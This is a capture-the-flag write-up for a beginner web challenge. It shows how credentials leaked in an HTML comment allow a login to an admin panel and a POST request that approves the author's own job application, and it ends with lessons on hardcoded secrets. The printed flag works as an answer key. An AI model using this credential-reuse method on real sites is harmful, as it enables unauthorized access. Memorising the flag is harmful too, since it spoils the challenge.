# Apply Here — Writeup

**Category:** Onboarding
**Difficulty:** Beginner
**Points:** 35
**Author:** Quack

---

## Challenge Description

> Brunnerne Incorporated is hiring! We are a fast-paced, mission-driven family looking for passionate self-starters to join our journey.
>
> So you applied. And then you waited. Estimated response time is 3 to 5 business decades and HR is frankly not reading their inbox.
>
> Maybe you should just approve yourself.

The objective is to get our own job application approved and retrieve the flag.

---

## Reconnaissance

The website contains several interesting endpoints:

```text
/
├── /apply
├── /status
├── /admin
└── /logout
```

The `/apply` page allows us to submit a job application, while `/status` shows the current state of our application.

The `/admin` endpoint is particularly interesting because it is described as the **Employee Portal**.

---

## Step 1 — Submit an Application

I first submitted a dummy application.

Example data:

```text
Name: test
Email: test@test.com
Position: Junior Synergy Facilitator
Motivation: I want to contribute to B Corp.
```

After submitting the application, the server redirected me to:

```text
/status
```

The application received the reference:

```text
BC-2974
```

Checking the status showed:

```text
Candidate: test
Email: test@test.com
Position: Junior Synergy Facilitator (12+ years experience required)
Status: PENDING
```

So the application was successfully created but was waiting for HR approval.

---

## Step 2 — Investigate `/admin`

The website footer contained a link to:

```text
/admin
```

Visiting it displayed an employee login page.

At this point, I inspected the HTML source.

This revealed something very interesting.

---

## Step 3 — Find Leaked Credentials

Inside an HTML comment, the application contained temporary HR credentials:

```html
<!--
TODO(marketing): remove before go-live!!!
Temporary HR credentials while SSO is "being procured":
user: hr.admin
pass: Synergy2024!
- Kevin, Q3 sprint 14
-->
```

The credentials were:

```text
Username: hr.admin
Password: Synergy2024!
```

This is a classic **information disclosure** vulnerability.

The credentials were not visible in the rendered page, but they were still delivered to the client as part of the HTML source.

---

## Step 4 — Login to the Employee Portal

I used the leaked credentials to authenticate through `/admin`.

The login request was:

```http
POST /admin
Content-Type: application/x-www-form-urlencoded

username=hr.admin&password=Synergy2024!
```

The server responded with a redirect:

```http
HTTP/2 302
Location: /admin/panel
```

The authenticated session was then able to access:

```text
/admin/panel
```

---

## Step 5 — Access the Applicant Review Panel

The admin panel displayed my application:

```text
Reference: BC-2974
Candidate: test
Email: test@test.com
Position: Junior Synergy Facilitator (12+ years experience required)
Motivation: I want to contribute to B Corp.
Status: PENDING
```

More importantly, the page contained an approval form:

```html
<form method="post" action="/admin/decide" class="decision">
    <button class="btn" name="decision" value="APPROVED" type="submit">
        Approve
    </button>

    <button class="btn danger" name="decision" value="REJECTED" type="submit">
        Reject
    </button>
</form>
```

This revealed the approval endpoint:

```text
POST /admin/decide
```

with the parameter:

```text
decision=APPROVED
```

---

## Step 6 — Approve the Application

I submitted the approval request:

```http
POST /admin/decide
Content-Type: application/x-www-form-urlencoded

decision=APPROVED
```

The application was successfully approved.

Checking `/status` again showed that the application was no longer pending.

The flag was then revealed.

---

## Flag

```text
brunner{l00k_m4_1_f1n411y_g0t_4_j0b!}
```

---

## Exploitation Flow

```text
                    Apply Here
                        │
                        ▼
                 Submit Application
                        │
                        ▼
                   /status
                        │
                  Status: PENDING
                        │
                        ▼
                    Discover
                     /admin
                        │
                        ▼
                  View HTML Source
                        │
                        ▼
             Leaked HR Credentials
                        │
                        ▼
              Login as hr.admin
                        │
                        ▼
                /admin/panel
                        │
                        ▼
             Find approval endpoint
                POST /admin/decide
                        │
                        ▼
              decision=APPROVED
                        │
                        ▼
              Application Approved
                        │
                        ▼
                       FLAG
```

---

## Vulnerability Analysis

### 1. Hardcoded Credentials

The most obvious vulnerability was the exposure of administrative credentials in an HTML comment:

```text
user: hr.admin
pass: Synergy2024!
```

HTML comments are **not secret**. Anything sent to the browser can be inspected by the user.

An attacker can simply use:

```text
View Source
```

or:

```text
curl
```

to retrieve the comment.

### 2. Excessive Administrative Access

Once the leaked credentials were used, the account had access to the applicant review functionality.

There was no additional restriction preventing the administrator from approving the application associated with the current session.

This allowed the attacker to effectively:

```text
Create application → Become HR → Approve own application
```

---

## Key Lessons

### Never store credentials in source code

Passwords, API keys, tokens, and other secrets should never be placed in:

```html
<!-- password = ... -->
```

or JavaScript, CSS, comments, or other client-accessible resources.

### Client-side hiding is not security

Something being hidden from the rendered page does not mean it is secret.

For example:

```html
<!-- SECRET -->
```

is still visible through:

```text
View Source
```

Developer Tools, Burp Suite, or:

```bash
curl
```

### Follow the clues

The challenge description said:

> "Maybe you should just approve yourself."

That strongly suggested looking for an application approval mechanism rather than trying to bypass the entire application.

The `/admin` link in the footer provided the next step, and the HTML comment provided the credentials.

---

## Tools Used

* Browser
* `curl`
* Burp Suite
* HTML source inspection

---

## Final Attack Chain

```text
Information Disclosure
        ↓
Leaked HR Credentials
        ↓
Administrative Authentication
        ↓
Applicant Review Access
        ↓
Approve Own Application
        ↓
Flag
```

**Flag:**

```text
brunner{l00k_m4_1_f1n411y_g0t_4_j0b!}
```
